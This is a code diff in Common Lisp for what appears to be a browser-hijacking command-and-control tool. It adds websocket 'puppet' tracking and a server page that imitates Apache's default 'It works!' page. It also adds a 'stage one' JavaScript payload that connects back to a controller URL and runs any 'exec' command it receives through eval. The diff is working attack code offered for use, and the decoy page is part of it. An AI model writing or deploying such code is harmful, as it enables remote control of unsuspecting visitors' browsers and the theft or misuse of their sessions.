@@ -17,6 +17,7 @@
   (:default-initargs                    ; default-initargs must be used
    :address "127.0.0.1"))               ; because ACCEPTOR uses it
 
+
 ;;; Specialise ACCEPTOR-DISPATCH-REQUEST for VHOSTs
 (defmethod hunchentoot:acceptor-dispatch-request ((vhost virtual-host) request)
   "Dispatches to the virtual host's internal dispatch table rather than the global."
@@ -28,9 +29,67 @@
   (dispatch-table vhost))
   (call-next-method))
 
+
 (defmethod port ((server virtual-host))
   "Returns the port on which the server is listening."
   (acceptor-port server))
+
+
+
+;;; Puppet Client
+;;; -------------
+
+(defclass puppet-client (hunchensocket:websocket-client)
+  ;; Name of the puppet. Used for lookups and all. 
+  ((name :initarg :name
+	 :initform (vampyre.utils:random-name 10)
+	 :accessor name)
+   ;; User Agent reported by the puppet.
+   (useragent :initarg :user-agent
+              :initform (error "User agent required for this puppet.")
+	      :accessor useragent)))
+
+
+(defmethod message ((puppet puppet-client) message)
+  (hunchensocket:send-text-message puppet message))
+
+
+(defmethod get-puppet ((chan websocket-channel) puppet-name)
+  (find-if #'(lambda (element) (string= (name element) puppet-name))
+	   (hunchensocket:clients chan)))
+
+
+(defmethod hunchensocket:text-message-received ((master websocket-channel) (puppet puppet-client) message)
+  (v:log :debug :message (format nil "New message from ~a: ~a~%" (name puppet) message))
+)
+
+
+;;; Puppet resource
+;;; ---------------
+
+(defclass websocket-channel (hunchensocket:websocket-resource)
+  ((uri :initarg :uri
+	 :initform (error "Choose a URI for this websocket-channel!")
+	 :reader uri))
+  (:default-initargs :client-class 'puppet-client))
+
+
+(defun make-websocket-channel (uri)
+  "Creates a new websocket channel."
+  ;; Ensures that no server with the same name or port already exist.
+  (make-instance 'websocket-channel :uri uri))
+
+
+(defmethod hunchensocket:client-connected ((master websocket-channel) (new-puppet puppet-client))
+  (v:log :info :join (format nil "Puppet ~a (~a) has joined the ~a master." (name new-puppet) (useragent new-puppet) (uri master))))
+
+
+(defmethod hunchensocket:client-disconnected ((master websocket-channel) (puppet puppet-client))
+  (v:log :info :leave (format nil "Puppet ~a (~a) has disconnected from ~a." (name puppet) (name puppet) (uri master))))
+
+
+(defmethod get-websocket-channel ((server delivery-server) uri)
+  (gethash uri (websocket-channels server)))
 
 
 ;;; Delivery Server
@@ -43,22 +102,47 @@
 
 
 ;;; This is our main delivery server class.
-(defclass delivery-server (virtual-host)
+(defclass delivery-server (virtual-host hunchensocket:websocket-acceptor)
   ((deliverer
     :initarg :deliverer
     :initform (error "Please name this delivery server!")
     :reader deliverer
     :documentation "Name of this delivery server.")
+   (websocket-channels
+    :initform (make-hash-table :test 'equal)
+    :accessor websocket-channels
+    :documentation "List of websocket handlers.")
   (url-table
     :initform (make-hash-table :test 'equal)
     :accessor url-table
     :documentation "User-accessible URL table that is used while rebuilding the server's dispatch table.")))
 
 
+(defun make-delivery-server (port name)
+  "Creates a new delivery server, and adds it to the global list."
+  ;; Ensures that no server with the same name or port already exist.
+  (if (not (or (get-delivery-server-by-name name)
+	       (get-delivery-server-by-port port)))
+      (push (make-instance 'delivery-server
+			   :port port
+			   :deliverer name
+			   :document-root "should/never/exist"
+			   :error-template-directory "should/never/exist")
+	    *delivery-servers*)
+      (format t "Port is occupied, or name already exists!")))
+
+
 (defmethod (setf url-table) (new-val (obj delivery-server))
   "Ensures that the dispatch-table is rebuilt when we modify the url table."
   (setf (slot-value obj 'url-table) new-val)
   (rebuild-dispatch-table obj))
+
+
+(defmethod (setf websocket-channels) (new-val (obj delivery-server))
+  "Ensures that the dispatch-table is rebuilt when we modify the url table."
+  (setf (slot-value obj 'websocket-channels) new-val)
+  (rebuild-websocket-dispatch-table obj))
+
 
 
 ;; URL Handling Functions
@@ -77,6 +161,18 @@
 	   (url-table server)))
 
 
+
+;; Websocket Handling Functions
+
+(defmethod rebuild-websocket-dispatch-table ((server delivery-server))
+  (setf hunchensocket:*websocket-dispatch-table* nil)
+  (when (websocket-channels server)
+    (push #'(lambda (request)
+	      (gethash (hunchentoot:script-name request)
+		    (websocket-channels server)))
+	  hunchensocket:*websocket-dispatch-table*)))
+
+
 (defmethod handle-url ((server delivery-server) url handler-func)
   "Defines a URL to call a given function."
   (format t "Handling '~a' with ~a...~%" url handler-func)
@@ -86,18 +182,15 @@
   (rebuild-dispatch-table server))
 
 
-(defun make-delivery-server (port name)
-  "Creates a new delivery server, and adds it to the global list."
-  ;; Ensures that no server with the same name or port already exist.
-  (if (not (or (get-delivery-server-by-name name)
-	       (get-delivery-server-by-port port)))
-      (push (make-instance 'delivery-server
-			   :port port
-			   :deliverer name
-			   :document-root "should/never/exist"
-			   :error-template-directory "should/never/exist")
-	    *delivery-servers*)
-      (format t "Port is occupied, or name already exists!")))  
+(defmethod handle-websocket-url ((server delivery-server) url)
+  "Defines a URL to call a websocket."
+  (format t "Handling websocket '~a'...~%" url)
+  (setf (gethash url
+		 (websocket-channels server))
+	(make-websocket-channel url))
+  (rebuild-websocket-dispatch-table server))
+
+  
 
 
 ;; Start and Stop functions
@@ -122,6 +215,7 @@
   (setf *delivery-servers* (delete server *delivery-servers*)))
 
 
+
 ;; Details Functions
 
 (defmethod display-details ((server delivery-server))
@@ -137,6 +231,7 @@
   `((name . ,(deliverer server))
     (port . ,(port server))
     (active . ,(format nil "~:[no~;yes~]" (started-p server)))))
+
 
 
 ;; Display Functions
@@ -188,15 +283,14 @@
 
   ;; GZip the resulting page.
   (gzip-compress 
-   (cl-who:with-html-output (*standard-output* nil :prologue nil)
+   (cl-who:with-html-output-to-string (*standard-output* nil)
      (:html
       (:head
-       (:meta :http-equiv "Content-Type" :content "text/html; charset=UTF-8")
+       (:meta :charset "UTF-8")
        (:title "Apache2 Default Page: It works"))
       (:body
        (:h1 "It works!")
-       (:script :type "text/javascript" :src "/script.js")))))
-  nil)
+       (:script :type "text/javascript" :src "/script.js"))))))
 
 ; By default, we use a 404 page similar to Apache's.
 (defmethod acceptor-status-message ((server delivery-server) http-return-code &key &allow-other-keys)
@@ -239,12 +333,72 @@
 
 
 
+(defun basic-websocket-puppet (uri)
+  (parenscript:ps
+    (defvar *socket* (new (-Web-Socket (ps:lisp uri))))
+    (defvar *keep-alive-interval* 10000)
+
+    ;; Defines the function to call as soon as the websocket is open.
+    (defun on-open (event)
+      (setf obj (create type "my-type"))
+      (chain *socket* (send (chain -J-S-O-N (stringify obj))))
+
+      ;; Setup the Pings.
+      (chain window (set-interval send-ping *keep-alive-interval*))
+      ())
+
+    ;; Test on-message function.
+    (defun on-message (event)
+      ;; We will be parsing JSON... Let's try-catch this.
+      (try
+       (progn
+	 
+	 ;; Do the parsing
+	 (setf json
+	       (chain -J-S-O-N (parse (chain event data))))
+	 ;; If the parsing succeeded, obtain the "type" attribute.
+	 (setf type
+	       (chain json type))
+	 
+	 ;; Checks that type exists
+	 (if (not (= (typeof type) "undefined"))
+
+	     ;; If type is exec, meaning that we want to execute a command.
+	     (if (= type "exec")
+		 (progn (chain console (log "can execute!"))
+
+			;; Try to retrieve the "command" attribute.
+			(setf command (chain json command))
+
+			;; If it exists...
+			(if (not (= (typeof command) "undefined"))
+			    (progn
+			      (chain console (log (+ "Executing: " command)))
+
+			      ;; Execute!
+			      (eval command))
+			    ;; Command does not exist.
+			    (chain console (log "No command defined!"))))
+		 ;; Logs the "type" attribute, since it seems unknown.
+		 (chain console (log type)))
+	     ;; Logs that there is no type.
+	     (chain console (log "No 'type' in this JSON object."))))
+      ;; If an error was thrown, log it.
+       (:catch (e) (chain console (log "invalid JSON.")))
+      
+      ;; Logs the event that was received, just in case.
+      (chain console (log event))))
+
+    ;; Function to send a keep-alive message.
+    (defun send-ping ()
+      (setf obj (create type "ping"))
+      (chain *socket* (send (chain -j-s-o-n (stringify obj)))))
+
+    ;; Binds the listener to the on-open function.
+    (setf (getprop *socket* 'onopen) on-open)
+    (setf (getprop *socket* 'onmessage) on-message)))
 
 
-
-;; TODO: For the communication server
-
-;; Combines both websocket server and regular web server in a single acceptor.
-(defclass super-acceptor (virtual-host
-			  hunchensocket:websocket-acceptor)
-  ())
+(defun send-stage-one (connect-back-url)
+  (setf (hunchentoot:content-type*) "text/javascript")
+  (format nil (basic-websocket-puppet connect-back-url)))
